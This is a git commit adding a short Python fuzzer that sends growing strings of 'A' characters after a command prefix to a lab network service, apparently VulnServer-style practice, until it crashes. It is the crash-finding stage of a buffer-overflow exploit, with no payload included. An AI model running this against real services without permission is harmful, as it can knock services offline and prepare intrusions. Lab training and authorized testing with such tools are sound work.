6e0a3c79746826ce5bffcc227957b4d840da1cb4
akil3s <53004342+akil3s79@users.noreply.github.com>
2021-08-05 09:40:12 +0200

    Create fuzzer.py

---
+++ fuzzer.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "10.10.25.41" # Change this
+
+port = 1337 # Change this
+timeout = 5
+prefix = "CULO " # Change this with the vulnerable parameter (Ex: TRUN, on VulnServer)
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Sending {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("The program has crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
